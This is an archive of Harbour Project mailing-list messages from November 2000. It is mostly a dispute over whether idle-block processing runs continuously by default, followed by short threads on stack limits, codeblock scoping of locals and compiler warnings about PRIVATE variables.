> Don't you agree, it is perfectly reasonable for any Harbour Developer
> to view a single Inkey() in *his* application as a single Wait State
> Event? Such developer need not know, or understand, the inner working
> of Harbour.

No, I don't agree. Harbour Project is specifically created to emulate 
existing legacy behaviour. Programmers who use CA-Clipper or 
Harbour that don't understand how it works will get spotty results. I 
can't imagine that ignorance is a good argument for any specific 
behaviour.
 
> > > What is wrong with allowing such block to Run once per Inkey(), if
> > > the developer so desires?

Nothing, as long as it is not default behaviour.

> > Nothing as long as the default condition works EXACTLY the way it
> > always has. Anything less than existing capability runs against the
> > original goals of the Harbour project.
> 
> It does EXACTLY!!!

Not if it triggers only once per idle state initiation. The default 
condition should be a free running idle event loop.

> BTW, I have no objection to this, but for the sake of pedantry I must
> insist, that including NanForum Toolkit compatibility, was *not* part
> the original goals of the Harbour Project.

Let's read what Ted Means (the Godfather of Clipper) wrote 
regarding this function:

****************************************

FT_ONIDLE()

  Description

     This function allows you to evaluate code blocks in the
      background while the foreground is in an idle state.

     To halt the evaluation of the code block during idle states, call
     FT_OnIdle() with no arguments.

     This function makes heavy use of several undocumented internal
     routines.  If this fact makes you uncomfortable then don't use
     this function, you putrid pile of chicken excrement.

 Examples


     FT_OnIdle( {|| QOut( "Hey, I'm not busy!" )} )

     Inkey( 0 )    // Let the fun begin

 Source: ONIDLE.C

 Author: Ted Means

*********************************************

As well, he exposed this:

*********************************************

 FT_IDLE()
 Generate an idle event to allow incremental garbage collection.

 Syntax

      FT_Idle()

 Arguments

     None

 Returns

     NIL

 Description

     During memory-intensive operations that do not generate much
     in the way of idle states, the Clipper runtime may not get a
     chance to perform garbage collection of discarded memory. 
     This can eventually lead to any of a variety of memory-related
     internal errors.

     This function attempts to alleviate the problem by providing a
     mechanism by which an idle event can be artifically generated at
     will.  The idle event will cause the CA-Clipper runtime to perform
     an incremental memory scavenge.

     This function makes use of an undocumented interal routine.  If
     this this fact makes you uncomfortable then don't use this
     function, you miserable jello-spined lump of human debris.

 Examples


     while Whatever         // Some batch process

       Something()          // Create 'n' discard a bunch of stuff

       FT_Idle()            // Take out the garbage

     end

 Source: IDLE.C

 Author: Ted Means (with much gratitude to Robert DiFalco)

*****************************************

If you run the example code for ft_onidle() using CA-Clipper and 
Nanfor, you will see a free running idle event. Not a single event. 
Those of us who have been using this capability in CA-Clipper for 
years expect idle events to work this way.

Even though this ability is uncovered in the Nanfor toolkit, it is clear 
that this is the way CA-Clipper works internally and that the Nanfor 
toolkit merely exposed this inherent capability to the coder.

There is a free running idle event loop in CA-Clipper that CA-
Clipper's garbage collector is hooked up to. This is why it was 
created this way in Harbour.
 
> 1. Again, it *does* so by *default*!

Idle events are free running by default in CA-Clipper.

> 2. Who is "we"? I know of quiet a few of "us", that are happy to
> embrace a slightly extended set of expectation and desires, that does
> include the above as an option. Especially since it comes practically
> free. 

An option, yes. A default, no.

3. I though you too agreed it might be useful.

You asked for a list of things that might use a freely running idle 
event loop. I listed three that I use commonly. None of them would 
work if the idle state triggered the event only once. Free running 
idle events are the form we (CA-Clipper users all over the world) 
have been using for years (via nanforum toolkit).

It is this capability that we (Harbour developers) emulated from the 
beginning. This capability came from CA-Clipper internals. We are 
creating a clone of CA-Clipper. Free running idle events should be 
the default because that is the way it is in CA-Clipper.

I think I've been around the CA-Clipper scene long enough to 
generalize that most CA-Clipper programmers that used any type 
of background (idle) event used the nanforum library to expose it 
and that gave them a free running idle event loop which ran only 
when nothing else was going on.

The only other CA-Clipper library that I know of that exposed any 
other type of background event processing was SilverClip SPCS 
and they built events in assembly code that used interrupt driven 
timers and had no link to the internal idle state mechanism in CA-
Clipper. These were very useful for some kinds of tasks and not 
useful for other kinds of tasks.

Since Nanfor was free and SilverClip SPCS was $399, I suspect 
that most programmers exposed to idle state processing used free 
running events. Probably at least 100:1.

Should we have 'real' background processing? Why not? But, there 
is no relationship of this kind of capability with the idle state loop.

If you want to add code that supplies other functionality, go for it, 
but please don't break what we already have working the way we 
(CA-Clipper users all over the world) have been using for years.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Tue Nov 28 00:35:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 00:35:03 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A22F4FE.30589.596DD0C@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEJPDHAA.ron@profit-master.com>

Phil

> > > Nothing as long as the default condition works EXACTLY the way it
> > > always has. Anything less than existing capability runs against the
> > > original goals of the Harbour project.
> >
> > It does EXACTLY!!!
>
> Not if it triggers only once per idle state initiation. The default
> condition should be a free running idle event loop.

Sorry for shouting, but I seem to repeat it so many times, yet some how it
just does not register: IT DOES NOT TRIGGER ONCE - IT TRIGGERS REPEATEDLY!!!
Please believe me, just try tests/idletest.prg, or at least read this prg.

Seriously, by default it triggers repeatedly, or "free running", or what
ever other term you want to use.

Please read again: *Unless* *explicitly* *requested* *otherwise*, BY DEFAULT
Harbour *does* trigger the Idle Blocks *repeatedly*! Just as it did before
this enhancement, which is *optional*, and is *not* the default.

> > BTW, I have no objection to this, but for the sake of pedantry I must
> > insist, that including NanForum Toolkit compatibility, was *not* part
> > the original goals of the Harbour Project.
>
> Let's read what Ted Means (the Godfather of Clipper) wrote
> regarding this function:

What's that to do with this issue? Again I don't object, but did we, or did
we not, include NanForum Toolkit compatibility in our original goals for
Harbour?

> If you run the example code for ft_onidle() using CA-Clipper and
> Nanfor, you will see a free running idle event. Not a single event.
> Those of us who have been using this capability in CA-Clipper for
> years expect idle events to work this way.

They still do!!! Did you try it with current Harbour? Did you check
tests/onidle.prg? Did you check tests/testidle.prg? Why do you rush to
conclusions without checking first?

> > 1. Again, it *does* so by *default*!
>
> Idle events are free running by default in CA-Clipper.

For the Nth. time, AND SO THEY ARE TOO in Harbour!!!

> > 2. Who is "we"? I know of quiet a few of "us", that are happy to
> > embrace a slightly extended set of expectation and desires, that does
> > include the above as an option. Especially since it comes practically
> > free.
>
> An option, yes. A default, no.

It *is* an option (disabled by default)!

> If you want to add code that supplies other functionality, go for it,
> but please don't break what we already have working the way we
> (CA-Clipper users all over the world) have been using for years.

Relax Phil, if you only tested, you would have no doubt found, that this
*option* is already in place, and does *not* break anything.

PLEASE, try tests/idletest.prg and/or tests/onidle.prg, and let us know what
you learned.

Ron


From harbour@lists.harbour-project.org  Tue Nov 28 01:30:04 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Tue Nov 28 01:30:04 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEJPDHAA.ron@profit-master.com>
References: <3A22F4FE.30589.596DD0C@localhost>
Message-ID: <3A230A7B.6042.5EACD68@localhost>

On 27 Nov 2000, at 21:36, Ron Pinkas wrote:

> Phil
 
> > > > Nothing as long as the default condition works EXACTLY the way
> > > > it always has. Anything less than existing capability runs
> > > > against the original goals of the Harbour project.

> > > It does EXACTLY!!!

> > Not if it triggers only once per idle state initiation. The default
> > condition should be a free running idle event loop.
 
> Sorry for shouting, but I seem to repeat it so many times, yet some
> how it just does not register: IT DOES NOT TRIGGER ONCE - IT TRIGGERS
> REPEATEDLY!!! Please believe me, just try tests/idletest.prg, or at
> least read this prg.
 
> Seriously, by default it triggers repeatedly, or "free running", or
> what ever other term you want to use.
 
> Please read again: *Unless* *explicitly* *requested* *otherwise*, BY
> DEFAULT Harbour *does* trigger the Idle Blocks *repeatedly*! Just as
> it did before this enhancement, which is *optional*, and is *not* the
> default.

Ok, then, I suppose the people who got stirred up over this will now 
back off and calm down.

> > > BTW, I have no objection to this, but for the sake of pedantry I
> > > must insist, that including NanForum Toolkit compatibility, was
> > > *not* part the original goals of the Harbour Project.
> >
> > Let's read what Ted Means (the Godfather of Clipper) wrote
> > regarding this function:
> 
> What's that to do with this issue? Again I don't object, but did we,
> or did we not, include NanForum Toolkit compatibility in our original
> goals for Harbour?

The reason this was included was not to show any capability of 
Nanfor, but to show that the default behaviour of CA-Clipper is a 
free running idle event loop and that programmers around the world 
have become accustomed to it working this way.

When you changed the default behaviour of the idle event loop, you 
stirred up a bees nest. When I brought up the history of the reason 
it is the way it is, you got offended. Why?
 
> > If you run the example code for ft_onidle() using CA-Clipper and
> > Nanfor, you will see a free running idle event. Not a single event.
> > Those of us who have been using this capability in CA-Clipper for
> > years expect idle events to work this way.
> 
> They still do!!! Did you try it with current Harbour? Did you check
> tests/onidle.prg? Did you check tests/testidle.prg? Why do you rush to
> conclusions without checking first?

I didn't rush to a conclusion. I didn't say that your code did not 
work the way I outlined. I stated the way it must work as a default 
and why. If Harbour works that way today, then great. I was merely 
stating historically why the idle event loop works the way it does 
today. I provided a historical perspective that exposed original CA-
Clipper design decisions.

> > > 1. Again, it *does* so by *default*!
> >
> > Idle events are free running by default in CA-Clipper.
> 
> For the Nth. time, AND SO THEY ARE TOO in Harbour!!!

Then why are you being so defensive? Your defensiveness makes 
it appear that you are still wanting it to not work this way!

> > > 2. Who is "we"? I know of quiet a few of "us", that are happy to
> > > embrace a slightly extended set of expectation and desires, that
> > > does include the above as an option. Especially since it comes
> > > practically free.
> >
> > An option, yes. A default, no.
> 
> It *is* an option (disabled by default)!

Perfect.
 
> > If you want to add code that supplies other functionality, go for
> > it, but please don't break what we already have working the way we
> > (CA-Clipper users all over the world) have been using for years.
> 
> Relax Phil, if you only tested, you would have no doubt found, that
> this *option* is already in place, and does *not* break anything.
> 
> PLEASE, try tests/idletest.prg and/or tests/onidle.prg, and let us
> know what you learned.

Ron, you originally came on with a change that broke things, 
several people tried to show you why the free running loop should 
be the default and you appeared to be argumentative and defensive. 
To me, this signified that you continued to feel your way should be 
the default, so I wrote this entire message to clarify WHY it is the 
way it is. As long as you defended your position, everyone viewed 
your change as a violation of known behaviour. Your defensive 
status caused you much of this misunderstanding even after you 
changed the behaviour back to desired defaults.

My reply was not intended to offend, but to inform. Nowhere in my 
reply did I say you did something wrong. Nowhere did I insult you. 
But, after a purely informative post, you reply as if you must still 
defend your position!

Rather than being argumentative in many messages, a simple

"Ok, I changed idle event processing back to default to the way it 
was before my change."

would have sufficed and would have defused the entire situation.

Nobody has argued that additional capabilities can't be added. 
They just can't be added at the cost of existing capabiltities, which 
it appeared you were lobbying for and initially did effect and 
apparently didn't understand.

I believe that this is how others percieved your stance as well. This, 
no doubt, led to to quite a discussion to expose the WHY of 
Harbour being the way it is. I posted that message because it 
appeared to me that you were not clear on the WHY of it from a 
historical perspective.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Tue Nov 28 02:26:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 02:26:03 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A230A7B.6042.5EACD68@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEKADHAA.ron@profit-master.com>

Phil,

> > What's that to do with this issue? Again I don't object, but did we,
> > or did we not, include NanForum Toolkit compatibility in our original
> > goals for Harbour?
>
> The reason this was included was not to show any capability of
> Nanfor, but to show that the default behavior of CA-Clipper is a
> free running idle event loop and that programmers around the world
> have become accustomed to it working this way.

Phil, you are still avoiding my simple point, that FT_ONIDLE() and NanForum
Toolkit compatibility in general, are not part of the Harbour-Project
original goals. I really don't mind that we do try to support it when not
conflicting with other concerns, but I had to point the inaccuracy in your
original post.

> When you changed the default behavior of the idle event loop, you
> stirred up a bees nest. When I brought up the history of the reason
> it is the way it is, you got offended. Why?

I did not get offended, but I did get frustrated, since you kept ignoring my
repeated attempts to assure you that the "expected" behavior was indeed the
implementation default.

> I didn't rush to a conclusion. I didn't say that your code did not
> work the way I outlined. I stated the way it must work as a default
> and why. If Harbour works that way today, then great. I was merely
> stating historically why the idle event loop works the way it does
> today. I provided a historical perspective that exposed original CA-
> Clipper design decisions.

I'm sorry for having to say that, but I would *not* comment on anything of
importance, until I personally checked and reviewed it, especially when the
subject is already charged with emotions. I expected you would first review
the current status before offering any input.

> > > > 1. Again, it *does* so by *default*!
> > >
> > > Idle events are free running by default in CA-Clipper.
> >
> > For the Nth. time, AND SO THEY ARE TOO in Harbour!!!
>
> Then why are you being so defensive? Your defensiveness makes
> it appear that you are still wanting it to not work this way!

I think redundant is a better description, and that is because I was being
advised of the same concern repeatedly. My answer had to remain the same.

> Ron, you originally came on with a change that broke things,
> several people tried to show you why the free running loop should
> be the default and you appeared to be argumentative and defensive.
> To me, this signified that you continued to feel your way should be
> the default, so I wrote this entire message to clarify WHY it is the
> way it is. As long as you defended your position, everyone viewed
> your change as a violation of known behavior. Your defensive
> status caused you much of this misunderstanding even after you
> changed the behavior back to desired defaults.

Phil, immediately after my first change was posted, the very first time, I
was told of FT_ONIDLE() I changed the default to repeat. It was without any
argument.

Here is a segment of my reply to Ryszard that day:

<<<<<<
When I made my change I did *not* know there might be code block expecting
such behavior. Had I known, I obviously would not post such change. Instead
I would have offered some other solution, which attempts to address both
needs.

Please note that FT_ONIDLE is *not* part of Clipper, so I would recommend we
proceed cautiously, without any rush or prejudice.

I on my part will change the default behavior to allow repeating processing.
In the hope we may then have productive review of all the input and
concerns.
>>>>>>

> My reply was not intended to offend, but to inform. Nowhere in my
> reply did I say you did something wrong. Nowhere did I insult you.
> But, after a purely informative post, you reply as if you must still
> defend your position!

You did not offend nor insult me. But you did fail to check the facts before
raising a concern that was baseless.

> Rather than being argumentative in many messages, a simple
>
> "Ok, I changed idle event processing back to default to the way it
> was before my change."
> would have sufficed and would have defused the entire situation.

Let's review my messages again:

<<<<<
I on my part will change the default behavior to allow repeating processing.
In the hope we may then have productive review of all the input and
concerns.
>>>>>

And:

<<<<<
2000-11-24 12:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * include/hbset.h
   * include/set.ch
   * source/pp/pptable.c
     + Added _SET_IDLEREPEAT = 101
   * source/rtl/set.c
     + Added suport for SET( _SET_IDLEREPEAT ) - Default is .T.

   * source/rtl/idle.c
     - Removed HB_IDLE_RESET()
     * Changed handling of Idle Process to default to REPEAT.
       ^^^^^^^                             ^^^^^^^    ^^^^^^

   * tests/onidle.prg
     - Removed call to HB_IDLE_RESET()

   + tests/testidle.prg
     + New test of Idle Blocks in default (REPEAT) mode and optional NON
REPEAT mode.
                                  ^^^^^^^  ^^^^^^           ^^^^^^^^
>>>>>

I hope you can now appreciate my expressed frustration.

Ron


From harbour@lists.harbour-project.org  Tue Nov 28 02:59:01 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Tue Nov 28 02:59:01 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEKADHAA.ron@profit-master.com>
References: <3A230A7B.6042.5EACD68@localhost>
Message-ID: <3A231F64.10181.63C7C9C@localhost>

On 27 Nov 2000, at 23:27, Ron Pinkas wrote:

> > The reason this was included was not to show any capability of
> > Nanfor, but to show that the default behavior of CA-Clipper is a
> > free running idle event loop and that programmers around the world
> > have become accustomed to it working this way.
 
> Phil, you are still avoiding my simple point, that FT_ONIDLE() and
> NanForum Toolkit compatibility in general, are not part of the
> Harbour-Project original goals. I really don't mind that we do try to
> support it when not conflicting with other concerns, but I had to
> point the inaccuracy in your original post.

Ron, you are still avoiding my simple point that FT_ONIDLE() 
displays inherent CA-Clipper internal operations and brings them to 
the surface for all to see how the internals obviously work. It's a 
history lesson from the godfather of CA-Clipper, Ron, not a desire 
to expand the Harbour Project to cover Nanfor functions.

Had you understood the reason for this in the first place, you would 
not have changed the existing behaviour. Becoming defensive 
doesn't cover for the fact that you didn't know this.

The garbage collector in CA-Clipper DOES use this internal free 
running idle state loop and so does the one in Harbour. When you 
changed that default behaviour in Harbour, you broke the garbage 
collector in Harbour. When you put the default behaviour back, it 
started working again. This has NOTHING to do with Nanforum 
library, other than understanding the default behavriour of 
FT_ONIDLE() exposes WHY.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Tue Nov 28 03:05:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 03:05:03 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A231F64.10181.63C7C9C@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEKADHAA.ron@profit-master.com>

Phil,

Must be very late in Florida (after 3am!!!) Good Night Phil.

Ron

From harbour@lists.harbour-project.org  Tue Nov 28 04:20:03 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Tue Nov 28 04:20:03 2000
Subject: [Harbour] Re: Changes in VM and eval stack (was:(Re: [Harbour]
 Randomgpfs)
Message-ID: <200011280418_MC2-BC59-4D7@compuserve.com>

David,

[about Clipper]

> But not for the stack. :-(

"Is the 64K maximum stack size limit for 16bit DOS programs present in
32bit protected mode?"

In Clipper, yes.  It doesn't run in 32-bit mode as a 32-bit app; it
still is a 16-bit creature.

"(I've never tried to use a stack larger than 64KB.)"

You can't even get close to 64KB.  Clipper puts all manner of things
into DGROUP, including the stack, and the whole of DGROUP is limited
to 64KB.

John.

From harbour@lists.harbour-project.org  Tue Nov 28 05:52:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Tue Nov 28 05:52:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011280550_MC2-BC54-8AA1@compuserve.com>

Phil,

JS> as I have said there's nothing to stop there being a non-OS dependent=

JS> stack implementation as well as ones which are far better but OS-
JS> dependent.

"Understandably, you have different goals"

Not really.  I think the stack should _not_ move around, as it breaks
the kind of code we already have and which any person adding code
would normally write, including the kind of code that works with
Clipper.  I don't much care if the stack is a linked list, slow and
bloated though it may be, as I'm in the (lucky?) situation of having
users used to slow & bloated apps on a slow & bloated OS.  My concern
is not for myself but for both Harbour's reputation and for other
users who may well not want a poor stack mechanism.

"every OS specific dependency takes us further from our original goal
of creating as much core code be non-specific as possible."

Of course.

"But, you and others have made your point and I suspect that the =

opportunity to override the default memory management can be =

made simple and straightforward without sacrificing the original =

goal."

It very much looks so. :-)

John.

From harbour@lists.harbour-project.org  Tue Nov 28 05:52:44 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Tue Nov 28 05:52:44 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011280550_MC2-BC54-8AA3@compuserve.com>

Phil,

JS> IAC, as I pointed out, Harbour has many non-ANSI functions in it.  I
JS> see no particular problem with getting a good stack implementation in=

JS> return for a small amount more of such functions.

"many of our developers have been running with the ANSI checking flag
on, which has eliminated most non-ANSI code."

Is that checking for calls to non-ANSI functions, i.e. functions not
listed in the ANSI Std?

My point remains: surely we want a good stack implementation.  One
that doesn't move the stack around!  And as I just posted yesterday
that should be stack_s_, being both Eval stack & CPU stack.

John.

From harbour@lists.harbour-project.org  Tue Nov 28 07:50:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 07:50:04 2000
Subject: [Harbour] private inside a method gives a warning
Message-ID: <3A23AA0D.E6862AD8@libero.it>

If I declare some private variables inside a method I get this error:

Copyright 1999-2000, http://www.harbour-project.org
Compiling 'farmaq.prg'...
Lines 96, Functions/Procedures 2
Generating C source output to 'farmaq.c'... Done.
Compiling 'tfarmaq.prg'...
tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
Lines 350, Functions/Procedures 13
Generating C source output to 'tfarmaq.c'... Done.
Compiling 'tb2html.prg'...


regards.

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 08:55:04 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Tue Nov 28 08:55:04 2000
Subject: [Harbour] doubly-detached locals
In-Reply-To: <001001c0577f$6c2c7590$8604d2cc@san.rr.com>
Message-ID: <3A23C80D.3367.42CBF82@localhost>

On 26 Nov 2000, at 0:03, Brian Hays wrote:

> I have some clipper code that I had to change to get to work right in
> Harbour. Basically, it seems that in Harbour a codeblock defined in a
> LOCAL statement can only reference locals already declared above it.
> In Clipper, the referenced variables could successfully be declared in
> a following LOCAL declaration.

  It is a documented Clipper incompatibility: see doc/codeblock.txt
We can fix it later after beta release.

Regards, Ryszard

From harbour@lists.harbour-project.org  Tue Nov 28 09:10:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 09:10:02 2000
Subject: [Harbour] doubly-detached locals
References: <3A23C80D.3367.42CBF82@localhost>
Message-ID: <3A23BC9E.8268FC38@libero.it>

Ryszard,

sorry to bother, but this line of code gives me an error (variable does
not exist) if executed:

cQuery := Eval(&(StrTran("{||" + oDomande:GetRow(i):FieldGet("query") +
"}", hb_OSNewLine())))

Note that I get a textual SQL query from a table, this query is
converted to a codeblock that when evaluated references locals declared
inside a method.

I need to use private variables to make it work, if I use locals it
gives an error, as I said.

Is this a known issue?

regards.

PS. A little clearer:

method xyz() class myclass

local cCod := "1234"

cQuery := Eval(&(StrTran("{||" + oDomande:GetRow(i):FieldGet("query") +
"}", hb_OSNewLine())))


return Self


cQuery is something like "SELECT * FROM IMS WHERE cod=cCod" and becomes:

"SELECT * FROM IMS WHERE cod=1234"

if cCod is a local I get an error. I don't get it if it is a private.
Maybe is a mistake on my side, but I think that locals should be ok in
this case.



Ryszard Glab ha scritto:
> 
> On 26 Nov 2000, at 0:03, Brian Hays wrote:
> 
> > I have some clipper code that I had to change to get to work right in
> > Harbour. Basically, it seems that in Harbour a codeblock defined in a
> > LOCAL statement can only reference locals already declared above it.
> > In Clipper, the referenced variables could successfully be declared in
> > a following LOCAL declaration.
> 
>   It is a documented Clipper incompatibility: see doc/codeblock.txt
> We can fix it later after beta release.
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 09:25:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Tue Nov 28 09:25:02 2000
Subject: [Harbour] private inside a method gives a warning
In-Reply-To: <3A23AA0D.E6862AD8@libero.it>
Message-ID: <3A23CDF4.29775.19B6B06@localhost>

Hi Maurilio,

Could you please check the PPO output, your information is really 
strange as a method is never else than a static function. So if this 
problem exist within a method you should be able to reproduce it 
within any (static) function. 

See you,

> If I declare some private variables inside a method I get this error:
> 
> Copyright 1999-2000, http://www.harbour-project.org
> Compiling 'farmaq.prg'...
> Lines 96, Functions/Procedures 2
> Generating C source output to 'farmaq.c'... Done.
> Compiling 'tfarmaq.prg'...
> tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
> tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> Lines 350, Functions/Procedures 13 Generating C source output to
> 'tfarmaq.c'... Done. Compiling 'tb2html.prg'...
> 
> 
> regards.
> 
> -- 
>  __________                   
> |  |  | |__| md2520@mclink.it 
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Tue Nov 28 09:41:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Tue Nov 28 09:41:02 2000
Subject: [Harbour] private inside a method gives a warning
In-Reply-To: <3A23AA0D.E6862AD8@libero.it>; from maurilio.longo@libero.it on Tue, Nov 28, 2000 at 01:50:21PM +0100
References: <3A23AA0D.E6862AD8@libero.it>
Message-ID: <20001128144014.T26952@hagbard.davep.org>

On Tue, Nov 28, 2000 at 01:50:21PM +0100, Maurilio Longo wrote:
> If I declare some private variables inside a method I get this error:
> 
> Compiling 'tfarmaq.prg'...
> tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
> tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> Lines 350, Functions/Procedures 13
> Generating C source output to 'tfarmaq.c'... Done.

They're warnings, not errors. What problem do you think you're experiencing?

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Tue Nov 28 09:56:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 09:56:02 2000
Subject: [Harbour] private inside a method gives a warning
References: <3A23AA0D.E6862AD8@libero.it> <20001128144014.T26952@hagbard.davep.org>
Message-ID: <3A23C7A3.4E258353@libero.it>

Dave,

I don't have problems, but I think I should not get a warning when I
declare a private variable.

regards.


Dave Pearson ha scritto:
> 
> On Tue, Nov 28, 2000 at 01:50:21PM +0100, Maurilio Longo wrote:
> > If I declare some private variables inside a method I get this error:
> >
> > Compiling 'tfarmaq.prg'...
> > tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
> > tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > Lines 350, Functions/Procedures 13
> > Generating C source output to 'tfarmaq.c'... Done.
> 
> They're warnings, not errors. What problem do you think you're experiencing?
> 
> --
> The Harbour Project: A free software Clipper compatible compiler
> Home Page..........: http://www.harbour-project.org/
> FAQ................: http://www.harbour-project.org/faq/harbour.html
> My harbour page....: http://www.hagbard.demon.co.uk/harbour/
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 10:30:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 10:30:03 2000
Subject: [Harbour] private inside a method gives a warning
References: <3A23CDF4.29775.19B6B06@localhost>
Message-ID: <3A23CFB3.B1B5129D@libero.it>

Jean,

look at this:

(E:\harbour\test)e:\harbour\bin\harbour -n -w -Ie:\harbour\include
test.prg
Harbour Compiler 0.35i (Build 35) (2000.10.23) (SimpLex)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'test.prg'...
test.prg(10) Warning W0001  Ambiguous reference: 'MYPRIV'
Lines 16, Functions/Procedures 2
Generating C source output to 'test.c'... Done.


for this little program:


procedure main()
        test()
return

static function test()

        local test
        private mypriv

        mypriv := "1"

return 0


regards.



jflefebv@mafact.com ha scritto:
> 
> Hi Maurilio,
> 
> Could you please check the PPO output, your information is really
> strange as a method is never else than a static function. So if this
> problem exist within a method you should be able to reproduce it
> within any (static) function.
> 
> See you,
> 
> > If I declare some private variables inside a method I get this error:
> >
> > Copyright 1999-2000, http://www.harbour-project.org
> > Compiling 'farmaq.prg'...
> > Lines 96, Functions/Procedures 2
> > Generating C source output to 'farmaq.c'... Done.
> > Compiling 'tfarmaq.prg'...
> > tfarmaq.prg(281) Warning W0001  Ambiguous reference: 'CMESE'
> > tfarmaq.prg(301) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > tfarmaq.prg(323) Warning W0001  Ambiguous reference: 'CCODCLIENTE'
> > Lines 350, Functions/Procedures 13 Generating C source output to
> > 'tfarmaq.c'... Done. Compiling 'tb2html.prg'...
> >
> >
> > regards.
> >
> > --
> >  __________
> > |  |  | |__| md2520@mclink.it
> > |_|_|_|____| Team OS/2 Italia
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> >
> >
> 
> Best regards,
> 
> J. Lefebvre <jflefebv@mafact.com>
> Mafact SA/NV
> Belgium
> (See us at http://www.mafact.com)
> jflefebv@mafact.com
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 10:46:01 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Tue Nov 28 10:46:01 2000
